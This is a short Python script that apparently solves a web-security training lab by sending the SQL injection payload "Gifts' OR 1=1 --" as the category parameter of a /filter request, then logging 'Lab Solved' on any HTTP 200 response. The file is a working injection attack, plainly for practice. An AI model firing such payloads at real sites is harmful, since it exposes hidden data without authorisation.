from base.base import Base

class SQL(Base):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        
    def _add_args(self):
        pass

    def run(self):
        self.params = {'category': "Gifts' OR 1=1 --"}
        response = self.session.get(f"{self.base_url}/filter", params=self.params)
        if response.status_code == 200:
            self.log("Lab Solved", "success")
        else:
            self.log(f"Failed to connect to {self.base_url}", "error")
        


if __name__ == "__main__":
    sql = SQL()
    sql.run()